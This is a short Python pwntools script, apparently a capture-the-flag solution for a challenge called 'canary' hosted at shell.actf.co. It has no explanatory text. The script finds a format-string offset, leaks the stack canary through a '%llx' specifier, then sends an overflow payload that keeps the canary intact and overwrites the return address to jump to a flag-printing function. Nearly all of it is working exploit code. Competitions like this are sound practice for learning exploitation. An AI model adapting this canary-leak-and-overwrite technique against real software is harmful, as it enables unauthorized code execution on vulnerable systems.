from pwn import *
from re import findall
context.log_level = 'CRITICAL' #make pwntools shutup
for i in range(20):
    r = process('./canary')
    r.sendlineafter('name? ', '%{}$llx'.format(i))
    if findall(' 4009c9!', r.recvuntil('!')) != []: break
    r.close()
else: exit(1)   #something wrong
r.close()
#some constants
canary_pos = i-2
flag = p64(0x400787)
to_cookie = 0x40-0x8
#exploit
r = remote('shell.actf.co', 20701) #process('./canary')
r.sendlineafter('name? ', '%{}$llx'.format(canary_pos))
cookie = findall('[0-9a-f]+!', r.recvuntil('!'))[0][:-1]
send = 'A'*to_cookie + p64(int(cookie, base=16)) + 'A'*0x8 + flag
r.sendline(send)
print findall('actf{.*}', r.recvuntil('}'))[0]
